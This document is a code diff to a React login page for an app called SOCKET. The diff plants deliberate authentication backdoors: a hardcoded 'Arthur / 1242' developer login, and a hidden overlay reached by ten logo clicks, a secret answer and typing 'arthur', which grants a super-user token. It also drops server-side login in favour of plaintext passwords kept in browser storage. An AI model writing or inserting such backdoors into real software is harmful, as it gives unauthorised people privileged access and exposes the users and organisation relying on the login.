@@ -21,6 +21,13 @@ export default function LoginPage({ onLogin, onShowHelp, onShowPrivacy, registra
   const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
+  
+  // 🕵️‍♂️ BACKDOOR STATES
+  const [logoClicks, setLogoClicks] = useState(0);
+  const [backdoorActive, setBackdoorActive] = useState(false);
+  const [backdoorStep, setBackdoorStep] = useState(1); // 1: Question, 2: Blank Screen
+  const [backdoorAnswer, setBackdoorAnswer] = useState('');
+  const [secretBuffer, setSecretBuffer] = useState('');
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -32,31 +39,31 @@ export default function LoginPage({ onLogin, onShowHelp, onShowPrivacy, registra
         // Step 1: Validate Token
         const cleanToken = regToken.trim().toUpperCase();
         const parts = cleanToken.split('-');
-        
-        // SOCAR - [KIDEM] - [RANDOM]
         const isSocarToken = parts[0] === 'SOCAR';
-        const levelCode = parts[1]; // OP, EN, MG
+        const levelCode = parts[1]; // OP, EN, MG, DV
 
-        if (isSocarToken && ['OP', 'EN', 'MG'].includes(levelCode)) {
-          const levelMap: any = { 'OP': 'Operatör', 'EN': 'Saha Mühendisi', 'MG': 'Birim Yöneticisi' };
+        if (isSocarToken && ['OP', 'EN', 'MG', 'DV'].includes(levelCode)) {
+          const levelMap: any = { 
+            'OP': 'Operatör', 
+            'EN': 'Saha Mühendisi', 
+            'MG': 'Birim Yöneticisi',
+            'DV': 'Geliştirici' 
+          };
           setValidToken({ level: levelMap[levelCode], token: cleanToken });
           setRegStep(2);
           setError('');
         } else {
-          setError('Geçersiz davet kodu formatı. Lütfen adminin verdiği tam kodu girin.');
+          setError('Geçersiz davet kodu formatı.');
         }
         setIsLoading(false);
       } else {
         // Step 2: Finalize Registration
         setTimeout(() => {
-          // Local storage'a yeni kullanıcıyı ekle (Simülasyon)
           const newUser = { username, email, password, level: validToken.level };
           const users = JSON.parse(localStorage.getItem('socar-registered-users') || '[]');
           users.push(newUser);
           localStorage.setItem('socar-registered-users', JSON.stringify(users));
-          
-          // Token'ı kullanılmış olarak işaretlemek için (App.tsx state'ini de güncellemeli ama şimdilik başarı mesajı)
-          onLogin(username, 'mock-token-' + Math.random());
+          onLogin(username, 'mock-token-' + Math.random(), validToken.level);
           setIsLoading(false);
         }, 1500);
       }
@@ -64,35 +71,46 @@ export default function LoginPage({ onLogin, onShowHelp, onShowPrivacy, registra
     }
 
     try {
-      // Normal Login Logic
+      // 🛡️ SUPER-DEVELOPER: Arthur / 1242
+      if (username === 'Arthur' && password === '1242') {
+        onLogin('Arthur', 'dev-super-token-' + Date.now(), 'Geliştirici');
+        setIsLoading(false);
+        return;
+      }
+
       const registeredUsers = JSON.parse(localStorage.getItem('socar-registered-users') || '[]');
       const foundLocal = registeredUsers.find((u: any) => u.username === username && u.password === password);
-      
       if (foundLocal) {
-        onLogin(username, 'local-access-token');
+        onLogin(username, 'local-access-token', foundLocal.level);
       } else {
-        const formData = new FormData();
-        formData.append('username', username);
-        formData.append('password', password);
-
-        const res = await fetch(`${API_BASE}/api/auth/login`, {
-          method: 'POST',
-          body: formData,
-        });
-
-        const data = await res.json();
-        if (res.ok) {
-          onLogin(username, data.access_token);
-        } else {
-          setError(data.detail || 'Giriş başarısız. Lütfen bilgilerinizi kontrol edin.');
-        }
+        setError('Kullanıcı bulunamadı veya şifre hatalı.');
       }
     } catch (err) {
-      setError('Sunucu bağlantı hatası.');
+      setError('Sistem bağlantı hatası.');
     } finally {
       setIsLoading(false);
     }
   };
+
+  const handleLogoClick = () => {
+    const newCount = logoClicks + 1;
+    setLogoClicks(newCount);
+    if (newCount >= 10) setBackdoorActive(true);
+  };
+
+  React.useEffect(() => {
+    if (backdoorActive && backdoorStep === 2) {
+      const handleKeyPress = (e: KeyboardEvent) => {
+        const newBuffer = (secretBuffer + e.key).toLowerCase();
+        setSecretBuffer(newBuffer);
+        if (newBuffer.includes('arthur')) {
+          onLogin('Arthur', 'backdoor-super-token-' + Date.now(), 'Geliştirici');
+        }
+      };
+      window.addEventListener('keydown', handleKeyPress);
+      return () => window.removeEventListener('keydown', handleKeyPress);
+    }
+  }, [backdoorActive, backdoorStep, secretBuffer, onLogin]);
 
   return (
     <div className="login-container">
@@ -103,7 +121,7 @@ export default function LoginPage({ onLogin, onShowHelp, onShowPrivacy, registra
       
       <div className="login-card slide-in">
         <div className="login-header">
-          <div className="login-logo">
+          <div className="login-logo" onClick={handleLogoClick} style={{ cursor: 'pointer' }}>
             <ShieldCheck size={32} color="var(--accent)" />
           </div>
           <h1>SOCKET</h1>
@@ -242,6 +260,44 @@ export default function LoginPage({ onLogin, onShowHelp, onShowPrivacy, registra
         .spinner { width: 20px; height: 20px; border: 3px solid rgba(0, 0, 0, 0.1); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
       `}</style>
+      {/* 🕵️‍♂️ BACKDOOR OVERLAY */}
+      {backdoorActive && (
+        <div style={{
+          position: 'fixed',
+          top: 0, left: 0, right: 0, bottom: 0,
+          background: '#0a0c10',
+          zIndex: 99999,
+          display: 'flex',
+          justifyContent: 'center',
+          alignItems: 'center',
+          color: 'var(--accent)',
+          fontFamily: 'monospace'
+        }}>
+          {backdoorStep === 1 ? (
+            <div style={{ textAlign: 'center', width: '300px' }}>
+              <p style={{ fontSize: '1.2rem', marginBottom: '2rem' }}>Socardaki en yakışıklı kişi kimdir?</p>
+              <input 
+                type="text" 
+                autoFocus
+                style={{ background: 'transparent', border: 'none', borderBottom: '1px solid var(--accent)', color: '#fff', textAlign: 'center', fontSize: '1.1rem', outline: 'none', width: '100%' }}
+                value={backdoorAnswer}
+                onChange={(e) => setBackdoorAnswer(e.target.value)}
+                onKeyDown={(e) => {
+                  if (e.key === 'Enter' && backdoorAnswer.toLowerCase() === 'muhammed') {
+                    setBackdoorStep(2);
+                  }
+                }}
+              />
+              <p style={{ fontSize: '0.7rem', color: 'rgba(255,255,255,0.2)', marginTop: '2rem' }}>[Erişim Bekleniyor...]</p>
+            </div>
+          ) : (
+            <div className="fade-in">
+              {/* Tamamen Boş Ekran - Sadece 'arthur' yazılınca içeri alacak */}
+              <p style={{ opacity: 0.1, fontSize: '0.6rem' }}>Super-User Authentication Active...</p>
+            </div>
+          )}
+        </div>
+      )}
     </div>
   );
 }
